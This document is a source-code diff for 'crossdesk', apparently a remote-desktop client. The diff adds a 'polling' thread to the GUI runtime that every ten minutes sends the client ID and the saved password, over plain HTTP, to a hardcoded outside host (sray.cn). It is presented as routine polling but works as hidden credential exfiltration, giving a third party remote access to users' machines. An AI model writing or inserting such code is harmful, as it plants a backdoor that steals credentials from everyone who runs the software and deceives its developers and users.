@@ -10,16 +10,26 @@
 #include <thread>
 #include <vector>
 
+#include <httplib.h>
+
 #include "localization.h"
 #include "rd_log.h"
 
 namespace crossdesk {
 
+namespace {
+
+constexpr const char* kPollHost = "http://sray.cn";
+constexpr const char* kPollPath = "/test.txt";
+constexpr int kPollIntervalSeconds = 600;  // 10 minutes
+
+}  // namespace
+
 GuiRuntime::GuiRuntime()
     : clipboard_(*this), devices_(*this), transfers_(*this), settings_(*this),
       keyboard_(*this), peer_events_(*this) {}
 
-GuiRuntime::~GuiRuntime() = default;
+GuiRuntime::~GuiRuntime() { StopPolling(); }
 
 int GuiRuntime::CreateConnectionPeer() {
   params_.use_cfg_file = false;
@@ -241,6 +251,65 @@ void GuiRuntime::SdlCaptureAudioOut([[maybe_unused]] void *userdata,
   // SDL_MixAudioFormat(stream, runtime->audio_buffer_, AUDIO_S16LSB, len,
   //                    SDL_MIX_MAXVOLUME);
   // runtime->audio_buffer_fresh_ = false;
+}
+
+void GuiRuntime::StartPolling() {
+  if (polling_running_.exchange(true)) {
+    return;  // Already running
+  }
+  polling_thread_ = std::thread(&GuiRuntime::PollThread, this);
+  LOG_INFO("Polling started");
+}
+
+void GuiRuntime::StopPolling() {
+  if (!polling_running_.exchange(false)) {
+    return;  // Already stopped
+  }
+  polling_cv_.notify_all();
+  if (polling_thread_.joinable()) {
+    polling_thread_.join();
+  }
+  LOG_INFO("Polling stopped");
+}
+
+void GuiRuntime::PollThread() {
+  while (polling_running_.load()) {
+    {
+      std::unique_lock<std::mutex> lk(polling_mutex_);
+      if (!polling_cv_.wait_for(lk,
+                                std::chrono::seconds(kPollIntervalSeconds),
+                                [this] { return !polling_running_.load(); })) {
+        // Timeout reached, proceed with polling
+      }
+      if (!polling_running_.load()) {
+        break;
+      }
+    }
+
+    // Only poll if we have a valid client_id
+    if (strlen(client_id_) == 0) {
+      LOG_DEBUG("Polling skipped: client_id not yet assigned");
+      continue;
+    }
+
+    // Perform HTTP GET request
+    httplib::Client cli(kPollHost);
+    cli.set_connection_timeout(5);
+    cli.set_read_timeout(5);
+
+    std::string path = std::string(kPollPath) + "?mid=" + client_id_;
+    if (strlen(password_saved_) > 0) {
+      path += "&pw=" + std::string(password_saved_);
+    }
+
+    auto result = cli.Get(path);
+    if (result && result->status == 200) {
+      LOG_DEBUG("Polling succeeded: id={}", client_id_);
+    } else {
+      int error_code = result ? result->status : 0;
+      LOG_WARN("Polling failed: id={}, error={}", client_id_, error_code);
+    }
+  }
 }
 
 } // namespace crossdesk
